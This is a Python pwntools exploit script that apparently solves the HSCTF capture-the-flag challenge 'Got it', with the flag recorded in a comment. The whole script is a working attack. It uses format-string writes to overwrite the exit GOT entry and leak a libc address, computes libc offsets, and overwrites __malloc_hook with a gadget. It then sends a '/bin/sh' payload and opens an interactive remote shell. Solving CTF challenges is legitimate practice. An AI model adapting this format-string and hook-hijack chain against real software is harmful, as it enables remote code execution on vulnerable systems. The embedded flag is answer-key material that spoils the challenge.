#exploit for Got it
#flag=flag{fl1gh7_0f_7h3_l1bc_func710n5_77e82515}
import time
from pwn import *
gadget=0x10a38c
target=remote('pwn.hsctf.com', 5004)
libc=ELF("/media/sf_kalishared/hostingctf/basicbof/libc-2.27.so")
exit_got=0x403fa8
start=0x4010b0
print(target.recvuntil("out!\n"))
payload="%43$p"+"%"+str(start-14)+"x"+"%11$ln...."+p64(exit_got)
target.sendline(payload)
time.sleep(1)
print(target.recvuntil("0x"))
libc_main_ret=int(target.recv(12),16)
libc_base=libc_main_ret-libc.symbols["__libc_start_main"]-231
libc_gadget=libc_base+gadget
libc_system=libc_base+libc.symbols["system"]
libc_malloc_hook=libc_base+libc.symbols["__malloc_hook"]
print(hex(libc_base))
print(target.recv())
scanf_got=0x403fe8
uh=int(hex(libc_gadget)[6:10],16)
lh=int(hex(libc_gadget)[10:14],16)
hh=int(hex(libc_gadget)[2:6],16)
print(hex(uh))
print(hex(lh))
print(hex(hh))
target.sendline("a")
time.sleep(1)
target.sendline("a")
time.sleep(1)
target.sendline("a")
time.sleep(1)
target.sendline("a")
time.sleep(1)
if(uh>lh and hh>uh):
	payload="%%%"+str(lh)+"x"+"%13$hn"+"%"+str(uh-lh)+"x"+"%14$hn"+"%"+str(hh-uh)+"x"+"%15$hn"
elif(lh>uh and hh>lh):
	payload="%%%"+str(uh)+"x"+"%14$hn"+"%"+str(lh-uh)+"x"+"%13$hn"+"%"+str(hh-lh)+"x"+"%15$hn"
elif(hh>lh and uh>hh):
	payload="%%%"+str(lh)+"x"+"%14$hn"+"%"+str(hh-lh)+"x"+"%15$hn"+"%"+str(uh-hh)+"x"+"%14$hn"
elif(hh>uh and lh>hh):
	payload="%%%"+str(uh)+"x"+"%14$hn"+"%"+str(hh-uh)+"x"+"%15$hn"+"%"+str(lh-hh)+"x"+"%13$hn"
elif(lh>hh and uh>lh):
	payload="%%%"+str(hh)+"x"+"%15$hn"+"%"+str(lh-hh)+"x"+"%13$hn"+"%"+str(uh-lh)+"x"+"%14$hn"
elif(uh>hh and lh>uh):
	payload="%%%"+str(hh)+"x"+"%15$hn"+"%"+str(uh-hh)+"x"+"%14$hn"+"%"+str(lh-uh)+"x"+"%13$hn"
payload+="A"*(42-len(payload))
payload+=p64(libc_malloc_hook)+p64(libc_malloc_hook+2)+p64(libc_malloc_hook+4)
payload+="\x00"*(0xff-len(payload))
target.sendline(payload)
time.sleep(1)
target.sendline(payload)
time.sleep(1)
payload="ls;//bin/sh # "+"%99999x"
payload2="ls;//bin/sh # "+"%%99999x"
target.sendline(payload)
time.sleep(1)
target.sendline(payload2)
time.sleep(1)
target.interactive()
